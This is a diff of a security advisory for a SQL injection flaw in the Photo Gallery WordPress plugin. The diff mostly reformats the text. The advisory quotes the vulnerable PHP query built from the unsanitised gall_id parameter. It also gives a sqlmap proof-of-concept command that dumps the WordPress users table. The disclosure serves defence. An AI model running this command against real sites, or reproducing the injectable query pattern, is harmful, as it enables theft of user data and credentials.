@@ -13,11 +13,15 @@ SQL Injection in Photo Gallery  Wordpress plugin
 
 * 2016-10-05: Vendor Notified
 
-*Vulnerability*: The file AYS_Gall_Main.php's edit function fails to sanitize the gall_id url parameter, allowing SQL injection:
+*Vulnerability*: The file `AYS_Gall_Main.php`'s edit function fails to sanitize the gall_id url parameter, allowing SQL injection:
 
 	$ays_gallery_id = $_GET["gall_id"];
         $res = $wpdb->get_row("SELECT * FROM ".$ays_gallery_table." WHERE id=".$ays_gallery_id."");
 
-*Proof of Concept*: `sqlmap --cookie="<insert Cookie here>" -u "http://wp.site/wp-admin/admin.php?page=ays_gall_main&gall_id=1&action=edit" --dbms=MYSQL -o -p "gall_id" --dump -T wp_users` for example would dump the users table from the Wordpress database.
+*Proof of Concept*: Using sqlmap
+
+`sqlmap --cookie="<insert Cookie here>" -u "http://wp.site/wp-admin/admin.php?page=ays_gall_main&gall_id=1&action=edit" --dbms=MYSQL -o -p "gall_id" --dump -T wp_users` 
+
+ would dump the users table from the Wordpress database.
 
 *Further Reading*: More information on SQLi [here](https://www.owasp.org/index.php/SQL_Injection)
